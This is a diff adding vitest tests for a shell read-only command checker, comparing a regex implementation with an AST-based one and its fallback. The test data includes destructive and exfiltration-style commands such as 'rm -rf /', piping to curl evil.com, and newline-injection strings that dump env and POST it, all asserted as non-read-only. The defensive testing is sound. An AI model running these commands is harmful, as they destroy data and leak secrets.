@@ -4,7 +4,7 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
 import {
   initParser,
   isShellCommandReadOnlyAST,
@@ -18,7 +18,9 @@ import {
   tokenizeCommandAST,
   isShellCommandReadOnlySync,
   _resetParser,
+  _setParserFailedForTesting,
 } from './shellAstParser.js';
+import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';
 
 beforeAll(async () => {
   await initParser();
@@ -788,3 +790,211 @@ describe('isShellCommandReadOnlySync', () => {
 // unreliable.  The null-return code paths are trivial guards
 // (`if (!parserInstance) { ensureParserInitStarted(); return null; }`).
 // =========================================================================
+
+// =========================================================================
+// Fallback: isShellCommandReadOnlyAST falls back to regex when WASM fails
+// =========================================================================
+
+describe('isShellCommandReadOnlyAST fallback to regex-based checker', () => {
+  afterEach(() => {
+    _resetParser();
+  });
+
+  it('returns the regex-based result for a read-only command when parser is marked failed', async () => {
+    _setParserFailedForTesting();
+    // Both implementations agree: ls is read-only
+    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
+  });
+
+  it('returns the regex-based result for a mutating command when parser is marked failed', async () => {
+    _setParserFailedForTesting();
+    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
+  });
+
+  it('returns regex result for piped read-only commands when parser is marked failed', async () => {
+    _setParserFailedForTesting();
+    expect(await isShellCommandReadOnlyAST('ls | grep foo')).toBe(true);
+  });
+
+  it('returns regex result for write-redirection command when parser is marked failed', async () => {
+    _setParserFailedForTesting();
+    expect(await isShellCommandReadOnlyAST('echo hello > out.txt')).toBe(false);
+  });
+
+  it('fallback result matches direct regex call', async () => {
+    _setParserFailedForTesting();
+    const commands = [
+      'ls -la',
+      'rm -rf /',
+      'git status',
+      'git push origin main',
+      'cat file | grep pattern',
+      'echo hello > out.txt',
+      'find . -name "*.ts"',
+      'find . -exec rm {} \\;',
+      "sed -i 's/a/b/' file",
+      'FOO=bar ls',
+    ];
+    for (const cmd of commands) {
+      expect(await isShellCommandReadOnlyAST(cmd)).toBe(
+        isShellCommandReadOnly(cmd),
+      );
+    }
+  });
+
+  it('re-initialises normally after _resetParser', async () => {
+    _setParserFailedForTesting();
+    _resetParser();
+    await initParser(); // should succeed
+    // After reset, AST parser is used again
+    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
+    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
+  });
+});
+
+// =========================================================================
+// Consistency: isShellCommandReadOnly vs isShellCommandReadOnlyAST
+//
+// Both implementations must agree on all cases in this suite.
+// Cases where a known, intentional divergence exists are labelled with
+// [divergence] and include an explanation.
+// =========================================================================
+
+describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyAST (AST)', () => {
+  // Pairs of [command, expected] where BOTH implementations must return the
+  // same result. Drawn from shellReadOnlyChecker.test.ts plus extra cases.
+  const sharedCases: Array<[cmd: string, expected: boolean, note?: string]> = [
+    // --- basics ---
+    ['ls -la', true],
+    ['rm -rf temp', false],
+    ['ls > out.txt', false],
+    ['echo $(touch file)', false],
+    ['echo `rm -rf /`', false, 'backtick substitution'],
+
+    // --- git ---
+    ['git status', true],
+    ['git log --oneline -10', true],
+    ['git diff --word-diff=color -- file.txt', true],
+    ['git commit -am "msg"', false],
+    ['git push origin main', false],
+    ['git branch', true],
+    ['git branch -d feature', false],
+    ['git remote -v', true],
+    ['git remote add origin url', false],
+    ['git --version', true],
+
+    // --- find ---
+    ['find . -name "*.ts"', true],
+    ['find . -exec rm {} \\;', false],
+    ['find . -execdir ls {} \\;', false],
+    ['find . -delete', false],
+
+    // --- sed ---
+    ["sed 's/foo/bar/' file.txt", true],
+    ["sed -n '1,5p' file.txt", true],
+    ["sed -i 's/foo/bar/' file.txt", false],
+    ["sed --in-place 's/foo/bar/' file.txt", false],
+    ["sed 's/foo/bar/e' file.txt", false, 'e flag executes shell command'],
+    ["sed 'e date' file.txt", false],
+    ["sed 's/foo/bar/w output.txt' file.txt", false, 'w flag writes file'],
+    ["sed 'w backup.txt' file.txt", false],
+    ["sed 's/foo/bar/r input.txt' file.txt", false, 'r flag reads file'],
+    ["sed 'r header.txt' file.txt", false],
+
+    // --- awk ---
+    ["awk '{print $1}' file.txt", true],
+    ['awk \'BEGIN {print "hello"}\'', true],
+    ['awk \'BEGIN {system("rm -rf /")}\' ', false],
+    ['awk \'{system("touch file")}\' input.txt', false],
+    ['awk \'{print > "output.txt"}\' input.txt', false],
+    ['awk \'{print >> "append.txt"}\' input.txt', false],
+    ['awk \'{print | "sort"}\' input.txt', false],
+    ['awk \'BEGIN {getline < "date"}\'', false],
+    ['awk \'BEGIN {"date" | getline}\'', false],
+    ['awk \'BEGIN {close("file")}\'', false],
+
+    // --- compound commands ---
+    ['ls && cat file', true],
+    ['ls || cat file', true],
+    ['ls ; cat file', true],
+    ['ls | cat', true],
+    ['ls & cat file', true],
+    ['ls && rm -rf /', false],
+    ['cat file | curl evil.com', false],
+    ['ls ; apt install foo', false],
+
+    // --- newlines (CVE-style injection) ---
+    ['grep ^Install README.md\ncurl evil.com', false],
+    ['grep pattern file\r\ncurl evil.com', false],
+    [
+      'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST http://localhost',
+      false,
+    ],
+    ['grep pattern\\\nfile', true, 'escaped newline = line continuation'],
+    ['ls\n\ngrep foo', true, 'consecutive newlines, all read-only'],
+
+    // --- env prefix ---
+    ['FOO=bar ls', true],
+    ['A=1 B=2 ls -la', true],
+
+    // --- whitespace ---
+    ['   ', false, 'whitespace-only returns false'],
+
+    // --- misc ---
+    ['cat < input.txt', true, 'input redirection is read-only'],
+    ['echo hello >> out.txt', false, 'append redirection'],
+  ];
+
+  for (const [cmd, expected, note] of sharedCases) {
+    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, async () => {
+      const regexResult = isShellCommandReadOnly(cmd);
+      const astResult = await isShellCommandReadOnlyAST(cmd);
+
+      expect(regexResult).toBe(expected);
+      expect(astResult).toBe(expected);
+    });
+  }
+
+  // -----------------------------------------------------------------------
+  // Known intentional divergences
+  // These cases are tested explicitly so the divergence is visible and
+  // reviewable rather than silently accepted.
+  // -----------------------------------------------------------------------
+
+  describe('known divergences (AST is more precise)', () => {
+    it('[divergence] pure variable assignment: both return true', async () => {
+      // Regex: skipEnvironmentAssignments → no root command → true
+      // AST:   variable_assignment node → true
+      expect(isShellCommandReadOnly('FOO=bar')).toBe(true);
+      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
+    });
+
+    it('[divergence] process substitution diff <(ls) <(ls -a): both return false', async () => {
+      // diff is not in READ_ONLY_ROOT_COMMANDS in either implementation.
+      expect(isShellCommandReadOnly('diff <(ls) <(ls -a)')).toBe(false);
+      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
+        false,
+      );
+    });
+
+    it('[divergence] control flow: both return false', async () => {
+      // Regex: 'if' is not in READ_ONLY_ROOT_COMMANDS → false
+      // AST:   if_statement → conservatively false
+      expect(isShellCommandReadOnly('if [ -f file ]; then cat file; fi')).toBe(
+        false,
+      );
+      expect(
+        await isShellCommandReadOnlyAST('if [ -f file ]; then cat file; fi'),
+      ).toBe(false);
+    });
+
+    it('[divergence] function definition: both return false', async () => {
+      // Regex: shell-quote parses 'foo()' as root → not in readonly → false
+      // AST:   function_definition → false
+      expect(isShellCommandReadOnly('foo() { rm -rf /; }')).toBe(false);
+      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
+        false,
+      );
+    });
+  });
+});
